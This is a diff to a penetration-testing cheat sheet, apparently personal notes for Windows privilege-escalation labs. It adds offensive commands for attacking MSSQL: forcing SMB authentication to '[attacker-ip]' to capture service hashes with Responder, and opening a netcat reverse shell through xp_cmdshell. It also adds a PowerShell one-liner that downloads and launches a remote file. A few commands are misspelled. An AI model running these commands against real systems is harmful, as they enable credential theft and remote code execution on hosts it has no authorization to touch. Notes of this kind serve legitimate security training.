@@ -208,7 +208,7 @@ Meterpreter
 - `load incognito`
 - `list_tokens -u`
 - `impersonate_token "[token]"`
-- Migrate to a process run by the impersonated token
+- Migrate to different service when `shell` is not working (that is running as the impersonated user)
   - `ps` (Shows all processes)
   - `migrate [PID]`
 
@@ -386,3 +386,32 @@ URLs:
 - https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-1388
 
 Using `msfconsole` with `use exploit/multi/script/web_delivery` can sometimes easily upgrade your shell.
+
+# Additional notes
+
+https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters
+
+Enumerating `.xlsm` files
+- `olevba [filename].xlsm`
+- Other option: `unzip [filename].xlsm`
+  - `strings [filename].bin`
+
+Enumerating MSSQL
+- `impacket-mssqlclient [name]@[ip] -windows-auth`
+- Try to get RCE `enable_xp_cmdshell`
+- Try to steal service hash
+  - `sudo responder -I [interface] -dPv`
+  - `exec xp_dirtree '\\[attacker-ip]\share\file'`
+  - `exec xp_fileexist '\\[attacker-ip]\share\file'`
+
+MSSQL Shell
+- `enable_xp_cdshell`
+- Host smb server: `impacket-smbserver -smb2support [dir-name] [path]`
+- `xp_cmdshell \\[ip]\[dir-name]\nc.exe -e cmd.exe [ip] [port]`
+
+Downloading to windows machine over SMB
+- `xcopy \\[ip]\[dir-name]\[file] .`
+
+Downloading to windows machine using powershell
+- `powershell "(New-Object System.Net.WebCient).Downloadfile('http://[ip]/[file]','[file]')"`
+- `Start-Process "[file]"`
